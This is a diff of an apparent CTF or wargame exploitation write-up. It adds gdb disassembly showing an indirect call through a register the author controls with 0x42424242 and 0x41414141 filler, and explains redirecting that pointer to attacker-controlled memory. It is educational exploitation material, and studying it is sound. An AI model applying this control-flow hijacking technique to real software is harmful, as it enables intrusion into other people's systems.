@@ -123,8 +123,19 @@ fs             0x0	0
 gs             0x33	51
 
 We can see that eax and ecx are set at 424242, we now have control on it.
+
+   0x0804867c <+136>:	mov    0x10(%esp),%eax
+   0x08048680 <+140>:	mov    (%eax),%eax
+=> 0x08048682 <+142>:	mov    (%eax),%edx
+   0x08048684 <+144>:	mov    0x14(%esp),%eax
+   0x08048688 <+148>:	mov    %eax,0x4(%esp)
+   0x0804868c <+152>:	mov    0x10(%esp),%eax
+   0x08048690 <+156>:	mov    %eax,(%esp)
+   0x08048693 <+159>:	call   *%edx
+
+edx takes value of eax, and then the call of edx is a pointer to function.
 We're going to send an address instead of the BBBB which point to another place
-where which we are in control. 
+where which we are in control.
 
 (gdb) x/100xw 0x804a00c
 0x804a00c:	0x41414141	0x41414141	0x41414141	0x41414141
